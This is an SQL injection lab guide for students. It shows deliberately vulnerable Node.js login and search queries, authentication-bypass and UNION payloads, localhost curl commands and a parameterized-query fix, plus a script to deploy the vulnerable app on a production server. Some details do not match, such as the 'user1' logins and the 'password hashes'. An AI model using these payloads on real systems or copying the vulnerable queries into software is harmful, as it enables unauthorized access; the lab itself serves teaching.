# SQL Injection Vulnerability Lab - Student Guide

## What is SQL Injection?

**SQL Injection** is a security vulnerability where an attacker inserts malicious SQL code into input fields. This malicious code gets executed by the database, allowing attackers to:
- Bypass authentication (login without valid credentials)
- Read unauthorized data
- Modify or delete data
- Execute administrative operations

### Why does it happen?
When applications **concatenate user input directly into SQL queries** without sanitization or validation, attackers can inject SQL commands that alter the query's logic.

---

## Setup: Get the Lab Running Locally

Before you start, run the application on your machine:

```bash
# Clone or navigate to the repo
cd securecorp-ctf

# Install dependencies
npm install

# Start the app
npm start
```

The app will start on `http://localhost:3000`. Open this in your browser.

**Demo Credentials** (already seeded in the database):
- admin / admin123 (administrator)
- alice / alice123
- bob / bob123
- carol / carol123

---

## Step 1: Understanding the Vulnerable Code

The vulnerable code is in `server.js` at the `/login` POST route. Here's what it looks like:

```javascript
// Login POST - VULNERABLE TO SQL INJECTION
app.post('/login', (req, res) => {
  const username = req.body.username || '';
  const password = req.body.password || '';

  // VULNERABLE: Direct string concatenation (SQL Injection)
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

  db.get(query, (err, row) => {
    if (err) {
      return res.send('Error');
    }

    if (row) {
      // User authenticated - create session
      req.session.userId = row.id;
      req.session.username = row.username;
      req.session.isAdmin = row.is_admin;
      return res.redirect('/dashboard');
    }

    res.send('Invalid credentials');
  });
});
```

### Why is this vulnerable?

The code directly inserts the username and password values into the SQL query **without any validation or escaping**:

```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

If a user enters special characters or SQL code in the username/password field, it becomes part of the actual SQL command. The database will execute whatever SQL the attacker crafts.

### Your Task for Step 1:

1. Open `server.js` and find the vulnerable login code above (around line 76-83).
2. Read through it carefully.
3. **Open the app at `http://localhost:3000/login`**
4. Try a normal login first with credentials: `admin` / `admin123` (should work)
5. Now try an injection payload (we'll show you how in Step 2)

---

## Step 2: How SQL Queries Work & Exploiting

Let's understand what the legitimate SQL query looks like:

**Normal Login (valid credentials):**
- Username: `admin`
- Password: `admin123`

The generated query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
```

This returns the admin user ✅

**Now let's inject malicious SQL:**

### Payload 1: Comment-based bypass
- **Username:** `admin' --`
- **Password:** `anything`

Generated query:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

The `--` **comments out everything after it**, so the password check is ignored! ✅

### Payload 2: OR-based bypass
- **Username:** `' OR '1'='1`
- **Password:** `' OR '1'='1`

Generated query:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

Since `'1'='1'` is **always true**, the WHERE clause matches ANY user (usually returns the first one). ✅

### Payload 3: UNION-based attack (advanced)
- **Username:** `admin' UNION SELECT * FROM users --`
- **Password:** `anything`

This **combines results** from multiple SELECT statements.

---

## Step 3: Constructing SQL Injection Queries

### Template for Building Payloads:

**Original Query:**
```sql
SELECT * FROM users WHERE username = 'INPUT1' AND password = 'INPUT2'
```

**Attack Strategies:**

#### Strategy 1: Comment Everything Out
```
username: ' --
password: anything
Result: SELECT * FROM users WHERE username = '' -- AND password = 'anything'
```

#### Strategy 2: OR Logic
```
username: ' OR '1'='1
password: ' OR '1'='1
Result: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

#### Strategy 3: Always True Condition
```
username: admin' OR 'x'='x
password: anything
Result: SELECT * FROM users WHERE username = 'admin' OR 'x'='x' AND password = 'anything'
```

#### Strategy 4: Break the Logic
```
username: ' OR 1=1 --
password: anything
Result: SELECT * FROM users WHERE username = '' OR 1=1 -- AND password = 'anything'
```

---

## Step 4: Exploiting on the Website

### Using the Web Browser:

1. Open `http://localhost:3000/login`
2. Try these payloads in the **Username** field:

| Payload | Password | Expected Result |
|---------|----------|-----------------|
| `admin' --` | `anything` | Login as admin ✅ |
| `' OR '1'='1` | `anything` | Login (first user) ✅ |
| `admin' OR '1'='1` | `test` | Login as admin ✅ |
| `user1' --` | `x` | Login as user1 ✅ |

### Using curl (Command Line):

```bash
# Comment bypass
curl -d "username=admin' --&password=test" http://localhost:3000/login -v

# OR bypass
curl -d "username=' OR '1'='1&password=' OR '1'='1" http://localhost:3000/login -v

# Check response for redirect to /dashboard (indicates successful login)
```

### Using Browser DevTools:

1. Open Developer Tools (F12)
2. Go to **Network** tab
3. Fill the login form with a payload
4. Click Login
5. Watch the POST request in the Network tab
6. You should see a **302 redirect** to `/dashboard` (means successful login!)

---

## Step 5: Getting Admin Access

### Admin Credentials (Hardcoded in server.js):
- **Username:** `admin`
- **Password:** `admin123`

But let's get admin access **without knowing the password**:

### Method 1: Direct Admin Bypass
```
Username: admin' --
Password: anything
```
Click Login → You're logged in as **admin** ✅

### Verify You're Admin:
1. After logging in, click "Profile"
2. You should see a **⭐ Administrator** badge
3. You should see a link to the **Admin Panel**

### Access Admin Panel:
1. Click "Admin Panel" link (only visible to admins)
2. You can see all users in the system
3. You can delete user accounts
4. You're now an authenticated administrator! 🎯

### What an Admin Can Do:
- View all user accounts
- Delete users
- Access sensitive user data (emails, names, etc.)

---

## Step 6: Fixing the Code (Remediation)

### The Vulnerable Code (WRONG ❌):
```javascript
// VULNERABLE: Direct string concatenation
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.get(query, (err, row) => { ... });
```

### The Secure Code (RIGHT ✅):
```javascript
// SECURE: Using parameterized queries
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.get(query, [username, password], (err, row) => { ... });
```

### Why This Works:

With **parameterized queries** (also called **prepared statements**):
- The SQL structure is defined FIRST
- User input is inserted AFTER the query structure is parsed
- The database treats user input as **DATA ONLY**, not as executable code
- Even if the user enters `admin' --`, it's treated as a literal string value

### Example:
```
Input: admin' --
Query: SELECT * FROM users WHERE username = ? AND password = ?
Result: Treated as literal string "admin' --", not as SQL code
```

### Changes Required in server.js:
1. **Line 81:** Change the query construction
2. **Line 83:** Pass parameters as an array to `db.get()`

### Lab Completion:
After making these changes:
1. Restart the server
2. Try the SQL injection payloads again
3. **They won't work anymore** ✅
4. Only valid credentials will work
5. Login with: `admin` / `admin123` should work normally

---

## Summary

| Step | Goal | Outcome |
|------|------|---------|
| 1 | Understand vulnerable code | Identified direct string concatenation |
| 2 | Learn how SQL injection works | Discovered comment (`--`) and OR (`'1'='1`) bypasses |
| 3 | Construct payloads | Built custom SQL injection queries |
| 4 | Exploit on website | Successfully bypassed authentication |
| 5 | Gain admin access | Logged in as administrator without password |
| 6 | Fix vulnerability | Implemented parameterized queries |

---

## Key Takeaways

✅ **Always use parameterized queries / prepared statements**
✅ **Never concatenate user input directly into SQL**
✅ **Validate and sanitize all user inputs**
✅ **Use ORM frameworks that handle escaping automatically**
✅ **Apply principle of least privilege to database accounts**

---

## Additional Challenges (Optional)

1. **Try other users:** Use SQL injection to login as `user1`, `user2`, `user3`
2. **Extract password hashes:** Modify payloads to dump user data using UNION SELECT
3. **Bypass other forms:** Check if other parts of the app have injection vulnerabilities
4. **Time-based injection:** Experiment with time delays to extract data character-by-character

---

## Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLite Query Language](https://www.sqlite.org/lang.html)
- [Prepared Statements](https://en.wikipedia.org/wiki/Prepared_statement)

---

## Update: Deployment & Persistence (2026-06-02)

### For Local Testing (Recommended for Students)

Just use:
```bash
npm install
npm start
```

Then open `http://localhost:3000`. The app uses a file-backed SQLite database (`data.sqlite`) so all data persists across restarts.

### For Production Deployment (Teachers/Labs on Debian/Ubuntu)

If you want to deploy this lab to a production Debian/Ubuntu server with Apache as a reverse proxy:

```bash
sudo bash deploy/setup.sh
```

This script:
- Installs Node.js, npm, Apache, and build tools
- Copies app files to `/var/www/ecommerce`
- Creates a systemd service `ecommerce.service` to keep the Node app running
- Configures Apache to proxy port 80 → Node.js port 3000
- Persists the SQLite database so seeded users and products survive restarts

**Note:** The deploy script is for production server setup only. For classroom/local use, just run `npm start`.

### Database Details

- **Persistent SQLite DB**: File-backed `data.sqlite` created in the app directory. All SQL queries run against this file.
- **Seeded users** (on first run):
  - admin / admin123 (is_admin = 1)
  - alice / alice123
  - bob / bob123
  - carol / carol123
- **30+ seeded products** with categories (Electronics, Cables, Accessories, Gaming, etc.) for richer search and injection exercises.

### Search Endpoint (Also Vulnerable)

A new route `GET /search?q=...` performs a vulnerable LIKE query:

```javascript
// VULNERABLE: direct concatenation
const query = `SELECT id, name, price, description, category FROM products WHERE (name LIKE '%${q}%' OR description LIKE '%${q}%')`;
if (category) query += ` AND category = '${category}'`;
```

Students can practice SQL injection payloads here too, including UNION-based attacks.

---

**If you'd like, I can add a `--vulnerable` / `--fixed` toggle to `deploy/setup.sh` so teachers can deploy either the intentionally vulnerable build or a fixed (parameterized queries) version for remediation demonstrations.** 
